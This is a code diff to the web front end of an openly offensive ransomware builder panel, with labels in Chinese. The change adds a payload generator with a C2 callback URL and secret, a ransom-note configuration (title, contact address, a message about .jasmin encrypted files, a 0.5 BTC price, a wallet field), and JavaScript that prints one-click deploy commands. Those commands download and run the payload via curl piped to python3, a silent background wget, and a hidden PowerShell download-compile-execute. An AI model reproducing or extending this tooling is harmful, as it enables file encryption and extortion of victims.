@@ -29,16 +29,33 @@
 
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
-<div class="gen-grid">
-  <div class="gen-card"><i class="fab fa-windows"></i><h3>Windows</h3><p>C# — AES+RSA</p><button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> 生成</button></div>
-  <div class="gen-card"><i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> 生成</button></div>
-  <div class="gen-card"><i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> 生成</button></div>
+<div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
+  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="http://127.0.0.1:5000/handshake"></div>
+  <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
+  <div class="field"><label>目标系统</label>
+    <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
+      <option value="win">🖥️ Windows (C#)</option>
+      <option value="linux">🐧 Linux (Python3)</option>
+      <option value="macos">🍎 macOS (Python3)</option>
+    </select>
+  </div>
 </div>
-<div class="gen-opts">
-  <div class="field"><label>C2 URL</label><input type="text" id="c2url" value="http://127.0.0.1:5000/handshake"></div>
-  <div class="field"><label>Secret</label><input type="text" id="gensecret" value="jasmin@123"></div>
+<h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
+<div class="gen-opts" style="grid-template-columns:1fr 1fr">
+  <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
+  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com"></div>
 </div>
-<div id="gen-result" class="gen-result"></div>
+<div class="field" style="margin-bottom:14px"><label>勒索信正文</label>
+<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">所有文件已使用 AES-256 + RSA-2048 军事级加密。
+不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
+联系我们获取私钥以解密文件。</textarea>
+</div>
+<div class="gen-opts" style="grid-template-columns:1fr 1fr">
+  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC"></div>
+  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value=""></div>
+</div>
+<div style="margin-top:16px"><button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button></div>
+<div id="gen-result" class="gen-result" style="margin-top:16px"></div>
 </section>
 
 <section class="panel" id="panel-victims">
@@ -150,14 +167,32 @@ function showTab(t){
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
 }
-function genPayload(p){
+function genPayload(){
+  var p=document.getElementById('gen-platform').value;
   var c2=document.getElementById('c2url').value,sec=document.getElementById('gensecret').value;
   var res=document.getElementById('gen-result');
-  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成...</span>';
+  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成 '+p+' 载荷...</span>';
   var fd=new FormData();fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);
+  fd.append('ransom_title',document.getElementById('ransom-title').value);
+  fd.append('ransom_contact',document.getElementById('ransom-contact').value);
+  fd.append('ransom_body',document.getElementById('ransom-body').value);
+  fd.append('ransom_price',document.getElementById('ransom-price').value);
+  fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
   fetch('/generate',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
-    if(d.ok)res.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+d.platform+'</b>: <a href="/payloads/'+d.file+'" download>'+d.file+'</a> ('+d.size+' B)</div>';
-    else res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';
+    if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
+    var pn={'win':'Windows','linux':'Linux','macos':'macOS'}[p]||p;
+    var dl='/payloads/'+d.file;
+    var h='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+pn+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
+    h+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
+    h+='<h4 style="color:var(--accent2);margin-bottom:10px"><i class="fas fa-terminal"></i> 一键部署命令</h4>';
+    if(p==='linux'||p==='macos'){
+      var u=location.origin+dl;
+      h+='<pre class="dt-code" style="margin:0"># curl 直接运行\ncurl -sL '+u+' | python3\n\n# wget 后台静默\nwget -q '+u+' -O /tmp/.j && nohup python3 /tmp/.j &</pre>';
+    }else{
+      h+='<pre class="dt-code" style="margin:0">:: PowerShell 下载运行\npowershell -w hidden -c "IWR \''+location.origin+dl+'\' -OutFile $env:TEMP\\j.cs; csc /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; Start-Process $env:TEMP\\j.exe"</pre>';
+    }
+    h+='</div></div>';
+    res.innerHTML=h;
   }).catch(e=>{res.innerHTML='<div class="gen-err">'+e+'</div>';});
 }
 </script>
